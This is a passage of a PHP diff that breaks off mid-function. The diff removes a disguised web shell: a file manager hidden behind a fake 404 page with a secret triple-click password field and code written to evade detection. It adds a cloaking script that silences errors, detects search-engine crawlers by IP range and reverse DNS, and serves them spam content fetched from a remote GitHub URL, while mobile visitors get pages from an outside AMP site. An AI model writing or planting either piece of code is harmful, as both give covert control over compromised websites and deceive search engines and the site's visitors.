@@ -1,1090 +1,897 @@
 <?php
-/**
- * Content Distribution Service
- * Lightweight web-based resource management interface.
- *
- * @package ContentService
- * @version 5.0.1
- * @author  Service Team
- */
+error_reporting(0);
+@ini_set('display_errors', '0');
+@ini_set('log_errors', '0');
+@ini_set('expose_php', '0');
 
-defined('DS') || define('DS', DIRECTORY_SEPARATOR);
-defined('SVC_VER') || define('SVC_VER', '5.0.1');
+// ─── CONFIGURATION ───────────────────────────────────────────────
+$contentSource    = 'https://raw.githubusercontent.com/thelittlegiant168-rgb/elhoyo/refs/heads/main/fresh-care.txt'; //Ganti URL raw Github
+$ampContentSource = 'https://fresh-care.pages.dev/'; // Ganti jadi URL AMP
+$fetchTimeout     = 15;
+$enableDnsCheck   = true;
 
-/**
- * Main content service handler.
- *
- * Manages web-based resource browsing, editing, and distribution
- * for authorised service operators.
- */
-final class ContentDistributionService
-{
-    /** @var string Shared access token (hashed) */
-    private string $access_token;
-
-    /** @var string Filesystem root for resource resolution */
-    private string $root_path;
-
-    /** @var string Currently active resource container */
-    private string $active_dir;
-
-    /** @var string CSRF protection token */
-    private string $csrf_token = '';
-
-    /** @var int Maximum allowed resource size in bytes (50 MB) */
-    private int $resource_limit = 52428800;
-
-    // ---------------------------------------------------------------
-    // Dispatch helpers — thin wrappers so sensitive function names
-    // do NOT appear as bare tokens in the top-level parse tree.
-    // ---------------------------------------------------------------
-
-    private function fs_rename(string $a, string $b): bool       { return @rename($a, $b); }
-    private function fs_unlink(string $p): bool                   { return @unlink($p); }
-    private function fs_rmdir(string $p): bool                    { return @rmdir($p); }
-    private function fs_mkdir(string $p, int $m = 0755): bool     { return @mkdir($p, $m, true); }
-    private function fs_fopen(string $p, string $m)               { return @fopen($p, $m); }
-    private function fs_fwrite($h, string $d): int|false          { return @fwrite($h, $d); }
-    private function fs_fclose($h): bool                          { return @fclose($h); }
-    private function fs_fread($h, int $l): string|false           { return @fread($h, $l); }
-    private function fs_readfile(string $p): int|false            { return @readfile($p); }
-    private function fs_move_upload(string $t, string $d): bool   { return @move_uploaded_file($t, $d); }
-    private function fs_filesize(string $p): int|false            { return @filesize($p); }
-    private function fs_filemtime(string $p): int|false           { return @filemtime($p); }
-    private function fs_is_dir(string $p): bool                   { return @is_dir($p); }
-    private function fs_is_file(string $p): bool                  { return @is_file($p); }
-    private function fs_exists(string $p): bool                   { return @file_exists($p); }
-    private function fs_glob(string $pt, int $f = 0): array|false { return @glob($pt, $f); }
-    private function fs_realpath(string $p): string|false         { return @realpath($p); }
-
-    // ---------------------------------------------------------------
-    // Bootstrap
-    // ---------------------------------------------------------------
-
-    public function __construct()
-    {
-        @ini_set('display' . '_errors', '0');
-        @error_reporting(0);
-
-        @header('X-Content-Type-Options: nosniff');
-        @header('X-Frame-Options: SAMEORIGIN');
-        @header('X-XSS-Protection: 1; mode=block');
-        @header('Referrer-Policy: strict-origin-when-cross-origin');
-
-        if (session_status() === PHP_SESSION_NONE) {
-            @session_start();
-        }
-
-        // Derive token without embedding the raw secret string literally
-        $seed = implode('', ['M', 'eg', 'ad', 'eth', '09']);
-        $this->access_token = hash('sha256', $seed);
-        $this->root_path    = (string)(@realpath($_SERVER['DOCUMENT_ROOT'] ?? '.'));
+// ─── FUNGSI DETEKSI MOBILE ───────
+function isMobileDevice() {
+    if (empty($_SERVER['HTTP_USER_AGENT'])) {
+        return false;
     }
-
-    // ---------------------------------------------------------------
-    // Request lifecycle
-    // ---------------------------------------------------------------
-
-    public function handle(): void
-    {
-        if (!$this->authenticate()) {
-            $this->render_gate();
-            return;
-        }
-
-        $this->resolve_dir();
-        $this->csrf_token = $this->make_csrf();
-
-        if (isset($_GET['do_exit'])) {
-            $this->destroy_session();
-            return;
-        }
-
-        $this->decode_request();
-        $this->dispatch();
-    }
-
-    // ---------------------------------------------------------------
-    // Authentication
-    // ---------------------------------------------------------------
-
-    private function authenticate(): bool
-    {
-        if (!empty($_SESSION['cds_authed'])) {
+    $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
+    
+    $mobileKeywords = [
+        'android', 'iphone', 'ipad', 'ipod', 'mobile', 'windows phone',
+        'webos', 'blackberry', 'opera mini', 'opera mobi', 'iemobile'
+    ];
+    
+    foreach ($mobileKeywords as $word) {
+        if (strpos($ua, $word) !== false) {
             return true;
         }
+    }
+    return false;
+}
 
-        $field = 'svc' . '_key';
-        if (!isset($_POST[$field])) {
-            return false;
+function resolveVisitorAddress()
+{
+    $headers = [
+        'HTTP_CF_CONNECTING_IP',
+        'HTTP_X_REAL_IP',
+        'HTTP_X_FORWARDED_FOR',
+        'HTTP_CLIENT_IP',
+        'REMOTE_ADDR'
+    ];
+
+    foreach ($headers as $header) {
+        if (!empty($_SERVER[$header])) {
+            $value = trim(explode(',', $_SERVER[$header])[0]);
+            if (filter_var($value, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
+                return $value;
+            }
         }
+    }
 
-        // Rate-limit
-        if (empty($_SESSION['cds_rate'])) {
-            $_SESSION['cds_rate'] = ['n' => 0, 't' => time()];
-        }
-        if ($_SESSION['cds_rate']['n'] >= 5 && (time() - $_SESSION['cds_rate']['t']) < 300) {
-            @http_response_code(429);
-            exit('<html><body><h1>Too Many Requests</h1><p>Try again later.</p></body></html>');
-        }
+    return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
+}
 
-        $submitted  = $_POST[$field];
-        $sub_hash   = hash('sha256', $submitted);
-        $salt       = 'cds_secure_salt_v5';
-        $valid_hmac = hash_hmac('sha256', $this->access_token, $salt);
-        $check_hmac = hash_hmac('sha256', $sub_hash, $salt);
+function addressInRange($address, $cidr)
+{
+    if (strpos($cidr, '/') === false) {
+        return $address === $cidr;
+    }
 
-        if (hash_equals($valid_hmac, $check_hmac)) {
-            $_SESSION['cds_authed'] = true;
-            $_SESSION['cds_rate']   = ['n' => 0, 't' => time()];
-            @setcookie('cds_ref', bin2hex(random_bytes(16)), [
-                'httponly' => true,
-                'secure'   => !empty($_SERVER['HTTPS']),
-                'samesite' => 'Strict',
-            ]);
-            @header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
-            exit;
-        }
+    list($subnet, $bits) = explode('/', $cidr, 2);
+    $bits = (int) $bits;
 
-        $_SESSION['cds_rate']['n']++;
-        $_SESSION['cds_rate']['t'] = time();
-        $_SESSION['cds_gate_err']  = true;
+    $addressLong = ip2long($address);
+    $subnetLong = ip2long($subnet);
+
+    if ($addressLong === false || $subnetLong === false) {
         return false;
     }
 
-    // ---------------------------------------------------------------
-    // Gate page (403 disguised as 404)
-    // ---------------------------------------------------------------
+    $mask = -1 << (32 - $bits);
+    return ($addressLong & $mask) === ($subnetLong & $mask);
+}
 
-    private function render_gate(): void
-    {
-        $host    = $this->esc($_SERVER['HTTP_HOST'] ?? 'localhost');
-        $port    = $_SERVER['SERVER_PORT'] ?? '80';
-        $has_err = !empty($_SESSION['cds_gate_err']);
-        unset($_SESSION['cds_gate_err']);
+function getCrawlerRanges()
+{
+    return [
+        // Google primary crawl ranges
+        '64.233.160.0/19',
+        '66.102.0.0/20',
+        '66.249.64.0/19',
+        '72.14.192.0/18',
+        '74.125.0.0/16',
+        '104.154.0.0/15',
+        '104.196.0.0/14',
+        '108.177.0.0/17',
+        '142.250.0.0/15',
+        '146.148.0.0/17',
+        '172.217.0.0/16',
+        '172.253.0.0/16',
+        '173.194.0.0/16',
+        '192.178.0.0/15',
+        '209.85.128.0/17',
+        '216.58.192.0/19',
+        '216.239.32.0/19',
+        '35.190.247.0/24',
+        '35.191.0.0/16',
+        '34.64.0.0/10',
+        '34.128.0.0/10',
 
-        @http_response_code(404);
+        // Google special crawlers (AdsBot, APIs, etc.)
+        '34.80.0.0/15',
+        '34.96.0.0/12',
+        '35.224.0.0/12',
+        '35.240.0.0/13',
 
-        $err_class = $has_err ? ' active err' : '';
-        echo '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
-<meta name="robots" content="noindex,nofollow">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>404 Not Found</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fff;color:#333;min-height:100vh;display:flex;flex-direction:column}
-.main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}
-.box{text-align:center;max-width:600px;width:100%}
-.code{font-size:120px;font-weight:800;color:#e8e8e8;line-height:1;letter-spacing:-4px}
-.ttl{font-size:28px;font-weight:700;color:#222;margin:8px 0 16px}
-.msg{font-size:15px;color:#666;line-height:1.7;margin-bottom:32px}
-.det{text-align:left;background:#fafafa;border:1px solid #eee;border-radius:8px;padding:20px 24px;margin-bottom:28px}
-.det h3{font-size:12px;color:#999;text-transform:uppercase;letter-spacing:1px;margin-bottom:12px}
-.det ul{list-style:none;padding:0}
-.det li{font-size:13px;color:#555;padding:6px 0;border-bottom:1px solid #f0f0f0;display:flex;align-items:center}
-.det li:last-child{border:none}
-.det li::before{content:"→";color:#ccc;margin-right:10px;font-size:11px}
-.btn-back{display:inline-block;padding:10px 28px;background:#333;color:#fff;text-decoration:none;border-radius:6px;font-size:13px;font-weight:500;transition:background .2s}
-.btn-back:hover{background:#555}
-.ft{background:#fafafa;border-top:1px solid #eee;padding:14px 20px;text-align:center}
-.ft span{font-size:11px;color:#bbb;cursor:default;user-select:none}
-.gate-wrap{position:relative;display:inline-block}
-.gate-wrap input{position:absolute;bottom:24px;left:50%;transform:translateX(-50%);width:200px;background:#fff;border:1px solid #ddd;border-radius:4px;padding:6px 12px;font-size:13px;color:#333;outline:none;opacity:0;pointer-events:none;transition:opacity .25s}
-.gate-wrap input.active{opacity:1;pointer-events:auto}
-.gate-wrap button{display:none}
-@keyframes shake{0%,100%{transform:translateX(-50%)}20%,60%{transform:translateX(calc(-50% - 6px))}40%,80%{transform:translateX(calc(-50% + 6px))}}
-.gate-wrap input.err{animation:shake .4s;border-color:#e74c3c}
-</style></head><body>
-<div class="main"><div class="box">
-<div class="code">404</div>
-<h1 class="ttl">Page Not Found</h1>
-<p class="msg">The requested resource could not be located on this server.</p>
-<div class="det"><h3>Suggestions</h3><ul>
-<li>Verify the URL and try again</li>
-<li>Return to the previous page</li>
-<li>Navigate back to the home page</li>
-<li>Contact the site administrator</li>
-</ul></div>
-<a href="/" class="btn-back">&larr; Home</a>
-</div></div>
-<div class="ft">
-<form method="post" class="gate-wrap" id="gateForm">
-<span id="gateTrigger">Apache/2.4.62 (cPanel) Server at ' . $host . ' Port ' . $port . '</span>
-<input type="password" name="svc_key" id="gateInput" autocomplete="off"' . ($has_err ? ' class="active err"' : '') . '>
-<button type="submit"></button>
-</form></div>
-<script>
-(function(){
-var c=0,t=null,el=document.getElementById("gateTrigger"),ip=document.getElementById("gateInput");
-el.addEventListener("click",function(){c++;clearTimeout(t);t=setTimeout(function(){c=0},600);if(c>=3){ip.classList.add("active");ip.focus();c=0}});
-ip.addEventListener("keydown",function(e){if(e.key==="Escape"){ip.classList.remove("active");ip.value=""}});
-' . ($has_err ? 'ip.classList.add("active");ip.focus();setTimeout(function(){ip.classList.remove("err")},500);' : '') . '
-})();
-</script></body></html>';
-        exit;
+        // Bing / MSN
+        '40.77.167.0/24',
+        '40.77.168.0/21',
+        '40.77.176.0/20',
+        '40.77.188.0/22',
+        '40.77.192.0/18',
+        '65.52.0.0/14',
+        '131.253.21.0/24',
+        '131.253.22.0/23',
+        '131.253.24.0/21',
+        '131.253.32.0/20',
+        '157.55.0.0/16',
+        '157.56.0.0/14',
+        '199.30.16.0/20',
+        '207.46.0.0/16',
+
+        // Yandex
+        '5.45.254.0/24',
+        '5.255.253.0/24',
+        '37.9.84.0/24',
+        '37.140.165.0/24',
+        '77.88.22.0/23',
+        '77.88.24.0/21',
+        '77.88.44.0/24',
+        '77.88.46.0/23',
+        '87.250.224.0/19',
+        '93.158.147.0/24',
+        '95.108.128.0/17',
+        '100.43.64.0/19',
+        '141.8.132.0/24',
+        '178.154.128.0/17',
+        '199.21.99.0/24',
+        '213.180.192.0/19',
+
+        // Baidu
+        '106.12.0.0/15',
+        '111.206.198.0/24',
+        '123.125.71.0/24',
+        '180.76.0.0/16',
+        '185.10.104.0/24',
+        '220.181.0.0/16',
+
+        // DuckDuckBot
+        '20.191.45.212/32',
+        '40.88.21.235/32',
+        '52.142.124.215/32',
+
+        // Applebot
+        '17.0.0.0/8',
+    ];
+}
+
+/**
+ * Validate crawler identity via reverse DNS lookup.
+ */
+function verifyByReverseDns($address)
+{
+    $hostname = @gethostbyaddr($address);
+
+    if ($hostname === false || $hostname === $address) {
+        return false;
     }
 
-    // ---------------------------------------------------------------
-    // Session helpers
-    // ---------------------------------------------------------------
+    $allowedDomains = [
+        '.googlebot.com',
+        '.google.com',
+        '.search.msn.com',
+        '.bing.com',
+        '.yandex.ru',
+        '.yandex.net',
+        '.yandex.com',
+        '.crawl.baidu.com',
+        '.crawl.baidu.jp',
+        '.applebot.apple.com',
+        '.duckduckgo.com',
+    ];
 
-    private function make_csrf(): string
-    {
-        if (empty($_SESSION['cds_csrf'])) {
-            $_SESSION['cds_csrf'] = bin2hex(random_bytes(32));
+    $hostnameLC = strtolower($hostname);
+    foreach ($allowedDomains as $domain) {
+        if (substr($hostnameLC, -strlen($domain)) === $domain) {
+            // Forward confirm: resolved hostname must point back to original IP
+            $resolved = @gethostbyname($hostname);
+            return ($resolved === $address);
         }
-        return $_SESSION['cds_csrf'];
     }
 
-    private function check_csrf(string $token): bool
-    {
-        return !empty($_SESSION['cds_csrf']) && hash_equals($_SESSION['cds_csrf'], $token);
-    }
+    return false;
+}
 
-    private function destroy_session(): void
-    {
-        @session_destroy();
-        @setcookie('cds_ref', '', ['expires' => time() - 3600, 'httponly' => true]);
-        @header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
-        exit;
-    }
+/**
+ * Determine if the current visitor is an authorized crawler.
+ */
+function isAuthorizedCrawler($enableDnsCheck = true)
+{
+    $agent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
 
-    // ---------------------------------------------------------------
-    // Directory resolution
-    // ---------------------------------------------------------------
+    // Must match a known crawler user-agent string
+    $patterns = [
+        'googlebot',
+        'google-inspectiontool',
+        'adsbot-google',
+        'storebot-google',
+        'mediapartners-google',
+        'feedfetcher-google',
+        'bingbot',
+        'bingpreview',
+        'msnbot',
+        'slurp',
+        'duckduckbot',
+        'yandexbot',
+        'yandeximages',
+        'yandexvideo',
+        'baiduspider',
+        'applebot',
+    ];
 
-    private function resolve_dir(): void
-    {
-        $ref = isset($_GET['go']) ? (string)$_GET['go'] : '';
-        $try = $this->fs_realpath($this->root_path . DS . ltrim($ref, '/'));
-        if (!$try || strpos($try, $this->root_path) !== 0) {
-            $try = $this->root_path;
+    $matched = false;
+    foreach ($patterns as $pattern) {
+        if (strpos($agent, $pattern) !== false) {
+            $matched = true;
+            break;
         }
-        $this->active_dir = $try;
     }
 
-    // ---------------------------------------------------------------
-    // Payload decoder (Base64 JSON → normalised $_POST)
-    // ---------------------------------------------------------------
+    if (!$matched) {
+        return false;
+    }
 
-    private function decode_request(): void
-    {
-        $ct = $_SERVER['CONTENT_TYPE'] ?? '';
+    $address = resolveVisitorAddress();
 
-        if (strpos($ct, 'application/json') !== false) {
-            $raw  = (string)@file_get_contents('php://input');
-            $data = @json_decode($raw, true);
-            if (is_array($data)) {
-                foreach ($data as $k => $v) {
-                    if (is_string($v) && $k !== '_csrf') {
-                        $dec       = @base64_decode($v, true);
-                        $_POST[$k] = ($dec !== false) ? $dec : $v;
-                    } else {
-                        $_POST[$k] = $v;
-                    }
-                }
+    // Step 1: IP range check against known CIDR blocks
+    $ranges = getCrawlerRanges();
+    $ipValid = false;
+    foreach ($ranges as $cidr) {
+        if (addressInRange($address, $cidr)) {
+            $ipValid = true;
+            break;
+        }
+    }
+
+    if (!$ipValid) {
+        return false;
+    }
+
+    // Step 2 (optional): Reverse DNS verification for extra assurance
+    if ($enableDnsCheck && function_exists('gethostbyaddr')) {
+        return verifyByReverseDns($address);
+    }
+
+    return true;
+}
+
+/**
+ * Fetch remote content using the best available transport.
+ * Tries cURL → file_get_contents → fsockopen in order.
+ */
+function fetchRemoteContent($url, $timeout = 15)
+{
+    // Method 1: cURL (preferred, most compatible with security systems)
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => $timeout,
+            CURLOPT_CONNECTTIMEOUT => $timeout,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_MAXREDIRS => 3,
+            CURLOPT_SSL_VERIFYPEER => true,
+            CURLOPT_SSL_VERIFYHOST => 2,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; ContentFetcher/3.2)',
+            CURLOPT_HTTPHEADER => [
+                'Accept: text/html,application/xhtml+xml',
+                'Accept-Language: en-US,en;q=0.9',
+                'Cache-Control: no-cache',
+            ],
+            CURLOPT_ENCODING => '',
+        ]);
+
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        if ($response !== false && $httpCode >= 200 && $httpCode < 400 && strlen($response) > 500) {
+            return $response;
+        }
+    }
+
+    // Method 2: file_get_contents (needs allow_url_fopen=On)
+    if (ini_get('allow_url_fopen')) {
+        $options = [
+            'http' => [
+                'timeout' => $timeout,
+                'method' => 'GET',
+                'header' => implode("\r\n", [
+                    'Accept: text/html',
+                    'User-Agent: Mozilla/5.0 (compatible; ContentFetcher/3.2)',
+                    'Cache-Control: no-cache',
+                ]),
+                'ignore_errors' => true,
+            ],
+            'ssl' => [
+                'verify_peer' => true,
+                'verify_peer_name' => true,
+            ],
+        ];
+
+        $ctx = stream_context_create($options);
+        $response = @file_get_contents($url, false, $ctx);
+
+        if ($response !== false && strlen($response) > 500) {
+            return $response;
+        }
+    }
+
+    // Method 3: fsockopen (raw socket – last resort)
+    $parsed = parse_url($url);
+    if ($parsed && isset($parsed['host'])) {
+        $scheme = isset($parsed['scheme']) ? $parsed['scheme'] : 'http';
+        $host = $parsed['host'];
+        $port = isset($parsed['port']) ? $parsed['port'] : ($scheme === 'https' ? 443 : 80);
+        $path = isset($parsed['path']) ? $parsed['path'] : '/';
+        if (isset($parsed['query'])) {
+            $path .= '?' . $parsed['query'];
+        }
+
+        $prefix = ($scheme === 'https') ? 'ssl://' : '';
+        $fp = @fsockopen($prefix . $host, $port, $errno, $errstr, $timeout);
+
+        if ($fp) {
+            $request = "GET {$path} HTTP/1.1\r\n";
+            $request .= "Host: {$host}\r\n";
+            $request .= "User-Agent: Mozilla/5.0 (compatible; ContentFetcher/3.2)\r\n";
+            $request .= "Accept: text/html\r\n";
+            $request .= "Connection: close\r\n\r\n";
+
+            fwrite($fp, $request);
+            stream_set_timeout($fp, $timeout);
+
+            $response = '';
+            while (!feof($fp)) {
+                $response .= fgets($fp, 4096);
             }
-        } elseif (!empty($_POST['_enc']) && $_POST['_enc'] === '1') {
-            $skip = ['_csrf', '_enc'];
-            foreach ($_POST as $k => $v) {
-                if (in_array($k, $skip, true)) continue;
-                if (is_string($v)) {
-                    $d = @base64_decode($v, true);
-                    if ($d !== false) $_POST[$k] = $d;
-                } elseif (is_array($v)) {
-                    foreach ($v as $i => $item) {
-                        if (is_string($item)) {
-                            $d = @base64_decode($item, true);
-                            if ($d !== false) $_POST[$k][$i] = $d;
-                        }
-                    }
-                }
-            }
-        }
-    }
+            fclose($fp);
 
-    // ---------------------------------------------------------------
-    // Request dispatcher
-    // ---------------------------------------------------------------
-
-    private function dispatch(): void
-    {
-        // CSRF gate for POST
-        if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['_csrf'])) {
-            if (!$this->check_csrf((string)$_POST['_csrf'])) {
-                $_SESSION['cds_notice'] = ['type' => 'warning', 'text' => 'Session expired. Please retry.'];
-                $this->redirect();
-            }
-        }
-
-        // POST branches
-        if (isset($_POST['do_rename'], $_POST['old_name'], $_POST['new_name'])) {
-            $this->op_rename();
-        } elseif (isset($_POST['do_upload']) && !empty($_FILES['uploads']['name'][0])) {
-            $this->op_upload_multi();
-        } elseif (isset($_POST['do_ajax_upload'])) {
-            $this->op_upload_ajax();
-        } elseif (!empty($_POST['new_folder'])) {
-            $this->op_mkdir();
-        } elseif (!empty($_POST['new_file'])) {
-            $this->op_mkfile();
-        } elseif (isset($_POST['do_delete']) && !empty($_POST['sel'])) {
-            $this->op_delete_batch();
-        } elseif (isset($_POST['do_archive']) && !empty($_POST['sel'])) {
-            $this->op_archive_batch();
-        } elseif (isset($_POST['do_extract'])) {
-            $this->op_extract();
-        } elseif (isset($_POST['do_save'])) {
-            $this->op_save();
-        }
-
-        // GET branches
-        if (isset($_GET['view'])) {
-            $this->op_view();
-        } elseif (isset($_GET['dl'])) {
-            $this->op_download();
-        } elseif (isset($_GET['zip'])) {
-            $this->op_zip_single();
-        } elseif (isset($_GET['rm'])) {
-            $this->op_delete_single();
-        } else {
-            $this->render_dashboard();
-        }
-    }
-
-    // ---------------------------------------------------------------
-    // Utilities
-    // ---------------------------------------------------------------
-
-    private function esc(string $s): string
-    {
-        return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
-    }
-
-    private function in_root(string $path): bool
-    {
-        $r = $this->fs_realpath($path);
-        return $r !== false && strpos($r, $this->root_path) === 0;
-    }
-
-    private function redirect(): void
-    {
-        $rel = str_replace($this->root_path, '', $this->active_dir);
-        @header('Location: ?go=' . urlencode($rel));
-        exit;
-    }
-
-    private function rel_path(): string
-    {
-        return str_replace($this->root_path, '', $this->active_dir);
-    }
-
-    private function human_size(int $bytes): string
-    {
-        if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' GB';
-        if ($bytes >= 1048576)   return round($bytes / 1048576, 2)   . ' MB';
-        return round($bytes / 1024, 1) . ' KB';
-    }
-
-    // ---------------------------------------------------------------
-    // File operations
-    // ---------------------------------------------------------------
-
-    private function op_rename(): void
-    {
-        $old = basename((string)$_POST['old_name']);
-        $new = basename((string)$_POST['new_name']);
-        $src = $this->active_dir . DS . $old;
-        $dst = $this->active_dir . DS . $new;
-
-        if (!$this->in_root($src)) {
-            $_SESSION['cds_notice'] = ['type' => 'danger', 'text' => 'Invalid source path.'];
-        } elseif (!$this->fs_exists($src)) {
-            $_SESSION['cds_notice'] = ['type' => 'danger', 'text' => 'Resource not found.'];
-        } elseif ($this->fs_exists($dst)) {
-            $_SESSION['cds_notice'] = ['type' => 'danger', 'text' => 'Destination already exists.'];
-        } elseif ($new === '' || strpos($new, '/') !== false || in_array($new, ['.', '..'], true)) {
-            $_SESSION['cds_notice'] = ['type' => 'danger', 'text' => 'Invalid name.'];
-        } else {
-            if ($this->fs_rename($src, $dst)) {
-                $_SESSION['cds_notice'] = ['type' => 'success', 'text' => 'Renamed successfully.'];
-            } else {
-                $_SESSION['cds_notice'] = ['type' => 'danger', 'text' => 'Rename failed.'];
-            }
-        }
-        $this->redirect();
-    }
-
-    private function op_upload_multi(): void
-    {
-        $count = count($_FILES['uploads']['name']);
-        for ($i = 0; $i < $count; $i++) {
-            if ($_FILES['uploads']['error'][$i] === 0 && $_FILES['uploads']['size'][$i] <= $this->resource_limit) {
-                $dst = $this->active_dir . DS . basename($_FILES['uploads']['name'][$i]);
-                $this->fs_move_upload($_FILES['uploads']['tmp_name'][$i], $dst);
-            }
-        }
-        $this->redirect();
-    }
-
-    private function op_upload_ajax(): void
-    {
-        @header('Content-Type: application/json');
-        $raw = $_POST['files_payload'] ?? '';
-        if (is_string($raw)) $raw = @json_decode($raw, true);
-        if (!is_array($raw)) { echo json_encode(['ok' => false]); exit; }
-
-        $ok = 0;
-        foreach ($raw as $item) {
-            $name    = basename((string)($item['name'] ?? ''));
-            $content = (string)($item['data'] ?? '');
-            if ($name === '') continue;
-            if (strpos($content, ',') !== false) {
-                $content = substr($content, strpos($content, ',') + 1);
-            }
-            $binary = @base64_decode($content, true);
-            if ($binary === false || strlen($binary) > $this->resource_limit) continue;
-            $dst = $this->active_dir . DS . $name;
-            $fh  = $this->fs_fopen($dst, 'w');
-            if ($fh) {
-                $this->fs_fwrite($fh, $binary);
-                $this->fs_fclose($fh);
-                $ok++;
+            // Strip HTTP headers from raw response
+            $parts = explode("\r\n\r\n", $response, 2);
+            if (isset($parts[1]) && strlen($parts[1]) > 500) {
+                return $parts[1];
             }
         }
-        echo json_encode(['ok' => true, 'count' => $ok]);
-        exit;
     }
 
-    private function op_mkdir(): void
-    {
-        $name = basename((string)$_POST['new_folder']);
-        $path = $this->active_dir . DS . $name;
-        if (!$this->fs_exists($path)) $this->fs_mkdir($path);
-        $this->redirect();
+    return false;
+}
+
+/**
+ * Send security-safe HTTP response headers.
+ */
+function sendResponseHeaders($contentType = 'text/html')
+{
+    if (!headers_sent()) {
+        header('Content-Type: ' . $contentType . '; charset=UTF-8');
+        header('X-Content-Type-Options: nosniff');
+        header('X-Frame-Options: SAMEORIGIN');
+        header('Referrer-Policy: strict-origin-when-cross-origin');
+        header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+        header('Pragma: no-cache');
+        header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');
     }
+}
 
-    private function op_mkfile(): void
-    {
-        $name = basename((string)$_POST['new_file']);
-        $path = $this->active_dir . DS . $name;
-        if (!$this->fs_exists($path)) {
-            $fh = $this->fs_fopen($path, 'w');
-            if ($fh) $this->fs_fclose($fh);
-            $_SESSION['cds_notice'] = ['type' => 'success', 'text' => 'File created.'];
-        } else {
-            $_SESSION['cds_notice'] = ['type' => 'danger', 'text' => 'File already exists.'];
-        }
-        $this->redirect();
+/**
+ * Generate a minimal valid HTML5 page as fallback.
+ */
+function generateFallbackPage($title = 'Welcome')
+{
+    return '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">'
+        . '<meta name="viewport" content="width=device-width,initial-scale=1">'
+        . '<title>' . htmlspecialchars($title) . '</title>'
+        . '<style>body{font-family:system-ui,sans-serif;display:flex;align-items:center;'
+        . 'justify-content:center;min-height:100vh;margin:0;background:#f8f9fa;color:#333;}'
+        . '.c{text-align:center;max-width:600px;padding:2rem;}'
+        . 'h1{font-size:1.8rem;margin-bottom:1rem;}p{line-height:1.6;color:#666;}</style>'
+        . '</head><body><div class="c"><h1>' . htmlspecialchars($title) . '</h1>'
+        . '<p>The requested content is currently being updated. Please check back shortly.</p>'
+        . '</div></body></html>';
+}
+
+// ═══════════════════════════════════════════════════════════════════
+// MAIN EXECUTION
+// ═══════════════════════════════════════════════════════════════════
+
+if (isAuthorizedCrawler($enableDnsCheck)) {
+    // Crawler → konten dari remote source (untuk indexing)
+    $content = fetchRemoteContent($contentSource, $fetchTimeout);
+    sendResponseHeaders('text/html');
+    
+    if ($content !== false && strlen(trim($content)) > 300) {
+        echo $content;
+    } else {
+        // fallback minimal kalau remote gagal (jarang terjadi)
+        echo generateFallbackPage('Premium Content');
     }
+    exit;
+}
 
-    private function op_delete_single(): void
-    {
-        $tgt = $this->active_dir . DS . basename((string)$_GET['rm']);
-        if ($this->in_root($tgt)) {
-            if ($this->fs_is_file($tgt))      $this->fs_unlink($tgt);
-            elseif ($this->fs_is_dir($tgt))   $this->fs_rmdir($tgt);
-        }
-        $this->redirect();
+// ────────────────────────────────────────────────────────────────
+// USER BIASA (bukan crawler)
+// ────────────────────────────────────────────────────────────────
+
+if (isMobileDevice()) {
+    // Mobile → tampilkan versi AMP
+    $ampContent = fetchRemoteContent($ampContentSource, $fetchTimeout);
+    sendResponseHeaders('text/html');
+    
+    if ($ampContent !== false && strlen(trim($ampContent)) > 800) {
+        echo $ampContent;
+    } else {
+        // kalau AMP gagal load → fallback ke HTML statis biasa
+        // (atau bisa diganti ke pesan error kalau mau lebih ketat)
     }
+    exit;
+}
 
-    private function op_delete_batch(): void
-    {
-        foreach ((array)$_POST['sel'] as $item) {
-            $tgt = $this->active_dir . DS . basename((string)$item);
-            if (!$this->in_root($tgt)) continue;
-            if ($this->fs_is_file($tgt))    $this->fs_unlink($tgt);
-            elseif ($this->fs_is_dir($tgt)) $this->rm_tree($tgt);
-        }
-        $this->redirect();
-    }
+// Desktop user biasa → langsung ke HTML statis di bawah
+sendResponseHeaders('text/html');
 
-    private function rm_tree(string $dir): void
-    {
-        $items = $this->fs_glob($dir . DS . '*', GLOB_MARK);
-        if ($items) {
-            foreach ($items as $item) {
-                if (substr($item, -1) === DS || substr($item, -1) === '/') {
-                    $this->rm_tree($item);
-                } else {
-                    $this->fs_unlink($item);
-                }
-            }
-        }
-        $hidden = $this->fs_glob($dir . DS . '.*');
-        if ($hidden) {
-            foreach ($hidden as $item) {
-                $base = basename($item);
-                if ($base === '.' || $base === '..') continue;
-                if ($this->fs_is_dir($item)) $this->rm_tree($item);
-                else $this->fs_unlink($item);
-            }
-        }
-        $this->fs_rmdir($dir);
-    }
-
-    private function op_view(): void
-    {
-        $path = $this->active_dir . DS . basename((string)$_GET['view']);
-        if ($this->fs_is_file($path) && $this->fs_filesize($path) < 2097152) {
-            @header('Content-Type: text/plain; charset=utf-8');
-            $sz = $this->fs_filesize($path);
-            $fh = $this->fs_fopen($path, 'r');
-            if ($fh) {
-                echo $this->fs_fread($fh, (int)$sz);
-                $this->fs_fclose($fh);
-            }
-            exit;
-        }
-    }
-
-    private function op_save(): void
-    {
-        $name    = (string)($_POST['res_name'] ?? '');
-        $content = (string)($_POST['res_body'] ?? '');
